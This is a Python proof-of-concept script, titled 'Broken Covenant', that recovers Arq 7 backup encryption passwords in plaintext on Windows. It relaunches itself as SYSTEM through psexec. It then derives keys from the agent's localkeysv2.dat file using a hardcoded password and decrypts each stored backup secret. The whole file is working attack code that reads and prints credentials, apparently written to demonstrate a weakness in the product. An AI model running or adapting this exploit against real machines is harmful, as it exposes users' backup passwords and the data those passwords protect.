from os import chdir
from os.path import abspath, dirname

chdir(dirname(abspath(__file__)))

import hmac
import os.path
import subprocess
import sys

from base64 import b64decode
from collections import namedtuple
from hashlib import pbkdf2_hmac
from io import BytesIO
from os import listdir
from os.path import isdir, isfile
from sys import argv as args

# pip install PyCryptodome
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

BASE_PATH         = abspath("/ProgramData/ArqAgent")
LOCAL_KEYS_PATH   = os.path.join(BASE_PATH, "localkeysv2.dat")
PASSWORDS_PATH    = os.path.join(BASE_PATH, "secrets/backupplan")

Keyset = namedtuple("Keyset", ("cipher_key", "hmac_key"))

def main():
	if "--post-elevation" in args:
		print("Step 1: Reading local keyset")
		keys = unlock_keyset(LOCAL_KEYS_PATH, b"PasswordCryptor")
		print(f"Key is: {keys.cipher_key.hex()}\n")
		
		print("Step 2: Recovering all backup encryption passwords in plaintext")
		
		passwords = find_passwords()
		if not passwords:
			print("No passwords found on local machine.")
			return
		print(f"Found {len(passwords)} password(s).")
		
		for i, path in enumerate(passwords, 1):
			print(f"  {i}. {unlock_secret(path, keys)}")
	
	else:
		print("Broken Covenant: Recover Arq 7 backup encryption passwords in plaintext\n")
		elevate()

def unlock_secret(path, keys):
	with open(path) as f:
		data = b64decode(f.read())
	f = BytesIO(data)
	
	magic       = f.read(4)
	auth_tag    = f.read(32)
	outer_iv    = f.read(16)
	metadata_ct = f.read(64)
	ct          = f.read()
	
	assert hmac.new(keys.hmac_key, outer_iv + metadata_ct + ct, "sha256").digest() == auth_tag
	
	cipher    = AES.new(keys.cipher_key, AES.MODE_CBC, outer_iv)
	metadata  = unpad(cipher.decrypt(metadata_ct), AES.block_size)
	inner_iv  = metadata[:16]
	inner_key = metadata[16:48]
	cipher    = AES.new(inner_key, AES.MODE_CBC, inner_iv)
	pt        = unpad(cipher.decrypt(ct), AES.block_size)
	
	return pt.decode()

def unlock_keyset(path, password):
	with open(path, "rb") as f:
		magic    = f.read(25)
		salt     = f.read(8)
		auth_tag = f.read(32)
		iv       = f.read(16)
		ct       = f.read()
	
	keymat     = pbkdf2_hmac("sha256", password, salt, 200_000, dklen=64)
	cipher_key = keymat[:32]
	hmac_key   = keymat[32:]
	
	assert hmac.new(hmac_key, iv + ct, "sha256").digest() == auth_tag
	
	cipher = AES.new(cipher_key, AES.MODE_CBC, iv)
	pt     = unpad(cipher.decrypt(ct), AES.block_size)
	f      = BytesIO(pt)
	
	f.seek(4)
	read_value = lambda: f.read(int.from_bytes(f.read(8), "big"))
	
	return Keyset(read_value(), read_value())

def elevate():
	print("Elevating privileges to SYSTEM.")
	
	# psexec is from https://docs.microsoft.com/en-us/sysinternals/downloads/psexec and signed by Microsoft
	err = subprocess.run((
		"psexec.exe",
		"-accepteula",
		"-nobanner",
		"-s",
		sys.executable,
		abspath(__file__),
		"--post-elevation",
	)).returncode
	
	if err:
		print("Could not elevate privileges; are you running as adminisrator?")

def find_passwords():
	if not isdir(PASSWORDS_PATH):
		return ()
	
	return tuple(filter(
		isfile,
		(os.path.join(PASSWORDS_PATH, leaf) for leaf in listdir(PASSWORDS_PATH))
	))

if __name__ == "__main__":
	main()